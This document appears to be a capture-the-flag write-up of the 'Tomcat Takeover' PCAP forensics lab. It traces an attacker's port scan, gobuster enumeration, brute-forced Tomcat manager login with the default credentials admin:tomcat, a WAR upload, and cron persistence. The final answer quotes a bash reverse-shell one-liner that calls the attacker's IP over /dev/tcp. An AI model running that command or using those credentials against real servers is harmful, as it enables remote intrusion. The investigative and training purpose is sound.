# **Tomcat Takeover: PCAP-Based Investigation of Apache Tomcat Web Server Compromise** 

## Cyber Defender

## Scenario

The SOC team detected suspicious activity originating from an internal web server running Apache Tomcat within the company’s intranet environment.

To investigate further, a full packet capture (PCAP) was collected from the affected network segment.

Your objective is to:

- Analyze the PCAP file for signs of exploitation
- Identify malicious HTTP requests targeting the Tomcat server
- Detect potential web shell uploads or remote code execution attempts
- Determine attacker IP addresses
- Assess command-and-control (C2) communication if present
- Define the scope and timeline of the compromise

## Alert

**Web Server Compromise Alert:** Suspicious HTTP activity detected targeting internal Apache Tomcat server, including anomalous POST requests and potential malicious file uploads.

PCAP analysis suggests exploitation attempts that may have resulted in unauthorized access and web shell deployment.

Immediate investigation required to determine impact and containment scope.

---

## Notes

### **Conversation Tab**

<img width="958" height="405" alt="Screenshot 2026-03-01 131254" src="https://github.com/user-attachments/assets/93eacf49-5088-4047-b70c-29e9c6198426" />

Analyzing the top talkers, IP Address are:

- 14.0.0.120 - The Attacker IP from china
- 10.0.0.112 -  The Web Server
- 10.0.0.115 - SMB
- 10.0.0.105 - SMB2

### Protocols in the pcap file

- SMB
- HTTP
- SSH

---

## Challenge Questions

1.Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?   

                                                                                

```jsx
Started 
1091	2023-09-10 18:18:52.961026	14.0.0.120	10.0.0.112	TCP	60	51985 ? 256 [SYN] Seq=0 Win=1024 Len=0 MSS=1460

Ended 
19947	2023-09-10 18:18:53.661272	10.0.0.112	14.0.0.120	TCP	60	6558 ? 51985 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

The attacker started scanning the network for open ports. The attacker found that port 8080 was opened and started exploring it.

Answer: 14.0.0.120

---

2.Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

Used IP info platform to check out the details of the attacker’s IP.

<img width="960" height="477" alt="Screenshot 2026-03-01 182620" src="https://github.com/user-attachments/assets/f93bcf83-9e97-4790-ab83-9d628bb8aff3" />

It was found out to be that the attacker is from the China.

Answer: China

---

3.From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

While Scanning the network for the open port the found that port 8080 was opened and got access to it.

<img width="960" height="392" alt="Screenshot 2026-03-01 184035" src="https://github.com/user-attachments/assets/222b9bd6-ad79-4702-a878-7696cc177f28" />

Answer: 8080

---

4.Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

The Filter command used:

```jsx
**((ip.addr==14.0.0.120 ) && (tcp.dstport == 8080)) && (http.request.method == "GET")**
```

The attacker started brute forcing the directories.

```jsx
Started
20106	2023-09-10 18:19:33.401808	14.0.0.120	10.0.0.112	HTTP	192	GET /0a2cd816-3c71-4411-b1a1-0287040f02d1 HTTP/1.1 

Ended
20671	2023-09-10 18:24:03.545590	14.0.0.120	10.0.0.112	HTTP	465	GET /examples/ HTTP/1.1 
```

<img width="958" height="427" alt="Screenshot 2026-03-01 184626" src="https://github.com/user-attachments/assets/f519a9e9-7981-496c-a619-25eae227eb25" />

The attacker is using a Directory brute forcing tool called gobuster.Gobuster is a fast, open-source tool written in Go, used for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names on web servers. It is widely used in penetration testing for directory enumeration, subdomain discovery, and finding hidden content, offering modes like `dir`, `dns`, `vhost`, `fuzz`, and `tftp`

Answer: Gobuster

---

5.After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

The Filter command used:

```jsx
((ip.addr==14.0.0.120 ) && (tcp.dstport == 8080)) && (http.request.method == "GET") 
```

<img width="960" height="429" alt="Screenshot 2026-03-01 185654" src="https://github.com/user-attachments/assets/f2317e95-8c7c-4ae9-913a-2d3beb9ba1c1" />

The Gobuster tool have found a directory /manager after the tool started doing recursive scan on the /manager directory.

Answer: /Manager

---

6.After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

The filter command 

```jsx
(((ip.addr==14.0.0.120 ) )) &&   (http.request.version == "HTTP/1.1")
```

On the packet 

```jsx
20553	2023-09-10 18:20:24.030141	14.0.0.120	10.0.0.112	HTTP	456	GET /manager/html HTTP/1.1 
```

<img width="960" height="451" alt="Screenshot 2026-03-01 191008" src="https://github.com/user-attachments/assets/bcda4d63-1a38-4ac5-9a68-7d646a3d3cc4" />

After entering the ID and Password the attacker gained access.

Answer: admin:tomcat

---

7.Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

The upload request will be in POST request format so i filtered it.

```jsx
20616	2023-09-10 18:22:14.310812	14.0.0.120	10.0.0.112	HTTP	712	POST /manager/html/upload;jsessionid=0DE586F27B2F48D0CA045F731E0E9E71?org.apache.catalina.filters.CSRF_NONCE=83EDF4E2462ECC725BAF342DD7A46974 HTTP/1.1 
```

<img width="958" height="426" alt="Screenshot 2026-03-01 191624" src="https://github.com/user-attachments/assets/236585f1-20d9-45e7-bf85-63e42571344f" />

Answer: JXQOZY.war

---

8.After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

The attacker gained access, attacker successfully established reverse shell on the web. 

The source port is 80 and the attacker used port 55162 as destination port. 

```jsx
Gained access on
20647	2023-09-10 18:22:23.262133	14.0.0.120	10.0.0.112	TCP	74	80 ? 55162 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=429801758 TSecr=3538440678 WS=128
```

The attacker ran the scheduled command on

```jsx
20666	2023-09-10 18:23:48.891161	14.0.0.120	10.0.0.112	TCP	145	80 ? 55162 [PSH, ACK] Seq=20 Ack=11 Win=65280 Len=79 TSval=429887388 TSecr=3538455869
```

Command used by the attacker 

<img width="655" height="431" alt="Screenshot 2026-03-01 192728" src="https://github.com/user-attachments/assets/1d61b18b-6be7-43c8-bd34-74737d0d6e00" />

Answer: /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1’

---

# MITRE ATT&CK Mapping

| ATT&CK Stage | Technique ID | Technique |
| --- | --- | --- |
| Reconnaissance | T1595.001, T1595.002 | Active Scanning, Vulnerability Scanning |
| Resource Development | - | - |
| Initial Access | T1190, T1110 | Exploit Public-Facing Application, Brute Force |
| Execution | T1059.004 | Unix Shell |
| Persistence | T1053.003 | Cron |
| Privilege Escalation | - | - |
| Defense Impairment | - | - |
| Credential Access | T1110 | Brute Force |
| Discovery | T1083 | File and Directory Discovery |
| Lateral Movement | - | - |
| Collection | - | - |
| Command and Control | T1071.001, T1105 | Application Layer Protocol: Web Protocols, Ingress Tool Transfer |
| Exfiltration | - | - |
| Impact | - | - |

### DONE BY

#### RUTHRAN-SEC
